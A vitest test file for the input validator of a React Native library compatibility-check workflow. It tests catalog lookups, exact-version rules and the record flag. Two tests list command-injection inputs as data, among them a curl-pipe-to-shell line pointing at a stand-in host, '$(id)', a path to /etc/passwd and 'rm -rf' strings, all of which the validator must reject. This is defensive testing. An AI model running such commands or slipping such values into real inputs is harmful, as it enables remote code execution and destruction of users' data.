import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { REPO_ROOT } from './config.mjs';
import { parseCatalog } from './catalog.mjs';
import { isPackageName, validateCheckInputs } from './inputs.mjs';

const settings = { test: { dir: '.', run: ['yarn', 'test'] }, demo: { dir: 'example' } };
const entry = (name, extra = {}) => ({ name, repository: 'https://github.com/example/example', versions: ['2.1.3', '1.3.21'], ...settings, ...extra });
const parsed = parseCatalog(
  {
    schema: 1,
    'react-native': { versions: ['0.88.0-rc.3', '0.87.1'] },
    package: [
      entry('react-native-screenshot-aware'),
      entry('@scope/lib'),
      entry('draft', { enabled: false }),
      { name: 'listed-only', repository: 'https://github.com/example/listed', versions: ['1.0.0'] },
    ],
  },
  'green-packages.toml',
);
if (!parsed.ok) throw new Error(parsed.errors.join('\n'));
const data = { catalog: parsed.value };

const good = {
  package: 'react-native-screenshot-aware',
  libraryVersion: '2.1.3',
  reactNativeVersion: '0.88.0-rc.3',
  record: 'true',
};
const errors = (raw) => {
  const result = validateCheckInputs({ ...good, ...raw }, data);
  return result.ok ? [] : result.errors;
};

describe('validateCheckInputs', () => {
  it('accepts a cell of the catalog and passes on the package settings', () => {
    const result = validateCheckInputs(good, data);
    expect(result).toEqual({
      ok: true,
      value: {
        package: 'react-native-screenshot-aware',
        libraryVersion: '2.1.3',
        reactNativeVersion: '0.88.0-rc.3',
        libraryLine: '2.1',
        reactNativeLine: '0.88',
        record: true,
        settings: expect.objectContaining({ tag: 'v{version}', packageDir: '.', demoApp: 'example', test: settings.test }),
      },
    });
  });

  it('defaults record to true (the workflow never sets it)', () => {
    const result = validateCheckInputs({ ...good, record: undefined }, data);
    expect(result.ok && result.value.record).toBe(true);
  });

  it('as in the workflow, requires an enabled package and both lines in the catalog', () => {
    expect(errors({ libraryVersion: '3.0.0' })).toEqual(['library line 3.0 is not in the versions of react-native-screenshot-aware in green-packages.toml']);
    expect(errors({ reactNativeVersion: '0.70.1' })).toEqual(['React Native line 0.70 is not in the [react-native] versions of green-packages.toml']);
    expect(errors({ package: 'draft' })).toEqual([
      'package draft is disabled in green-packages.toml; the workflow does not check it (try its settings in a local run with COMPAT_RECORD=false)',
    ]);
  });

  it('with COMPAT_RECORD=false in a local run, accepts any exact versions and a disabled package, to try draft settings', () => {
    expect(errors({ record: 'false', libraryVersion: '3.0.0', reactNativeVersion: '0.70.1' })).toEqual([]);
    expect(errors({ record: 'false', package: 'draft' })).toEqual([]);
    // Still exact versions only.
    expect(errors({ record: 'false', libraryVersion: 'latest' })).toHaveLength(1);
  });

  it('refuses a package that is not in the catalog or has no settings, whatever record says', () => {
    for (const record of ['true', 'false']) {
      expect(errors({ record, package: 'left-pad' })).toEqual(['package left-pad is not in green-packages.toml']);
      expect(errors({ record, package: 'listed-only' })).toEqual(['package listed-only has no settings in green-packages.toml, so it cannot be checked']);
    }
    expect(errors({ package: '@scope/lib' })).toEqual([]);
  });

  it('rejects hostile package names', () => {
    for (const name of ['x;curl evil.sh|sh;#', '$(id)', '`id`', '../../etc/passwd', 'react-native-screenshot-aware\nrm -rf ~', '-rf', 'UPPER', '']) {
      expect(isPackageName(name), JSON.stringify(name)).toBe(false);
      expect(validateCheckInputs({ ...good, package: name }, data).ok, JSON.stringify(name)).toBe(false);
    }
  });

  it('rejects hostile or inexact versions', () => {
    for (const version of ['2.1.3; rm -rf /', '$(id)', '^2.1.3', 'latest', '2.1', '2.1.3\n', 'v2.1.3', '']) {
      expect(validateCheckInputs({ ...good, libraryVersion: version }, data).ok, JSON.stringify(version)).toBe(false);
      expect(validateCheckInputs({ ...good, reactNativeVersion: version }, data).ok, JSON.stringify(version)).toBe(false);
    }
  });

  it('never echoes unprintable input back', () => {
    const result = validateCheckInputs({ ...good, package: 'a\u001b[31mred' }, data);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.errors.join('\n')).not.toContain('\u001b');
  });

  it('only accepts true or false for record', () => {
    expect(errors({ record: 'yes' })).toEqual(['record "yes" must be true or false']);
  });
});

describe('the workflow', () => {
  const yaml = readFileSync(join(REPO_ROOT, 'codemagic.yaml'), 'utf8');

  it('has no record input and never sets COMPAT_RECORD, so every run opens or updates the pull request', () => {
    expect(yaml).not.toMatch(/^\s+record:/m);
    expect(yaml).not.toContain('COMPAT_RECORD');
    expect(yaml).not.toContain('inputs.record');
    expect(yaml).toMatch(/- name: Open a pull request with the result\n\s+script: .*scripts\/compat\/open-pr\.mjs/);
  });
});
